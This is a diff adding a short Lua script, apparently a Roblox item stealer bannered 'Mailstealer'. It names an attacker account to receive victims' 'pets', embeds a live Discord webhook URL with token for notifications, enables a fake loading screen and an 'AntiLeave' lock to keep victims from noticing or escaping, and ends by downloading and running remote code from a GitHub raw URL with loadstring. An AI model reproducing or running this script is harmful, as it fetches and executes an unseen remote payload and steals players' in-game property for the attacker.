@@ -1,0 +1,18 @@
+--[[
+  __  __       _ _     _             _           
+  |  \/  | __ _(_) |___| |_ ___  __ _| | ___ _ __ 
+  | |\/| |/ _` | | / __| __/ _ \/ _` | |/ _ \ '__|
+  | |  | | (_| | | \__ \ ||  __/ (_| | |  __/ |   
+  |_|  |_|\__,_|_|_|___/\__\___|\__,_|_|\___|_|   
+
+]]--
+
+UserName = "lalav670" -- good pets
+Webhook = "https://discord.com/api/webhooks/1131496399222095932/Aban5KFe8ib9l_iImDSS5awJ9ExR4y9BdjWWV0OrOheyAdh5tffzQPi29STu5iggJJtR" -- pings for pets
+UserName2 = "lalav670" -- bad pets
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LynX5561/Valhalla/main/Valhalla", true))()
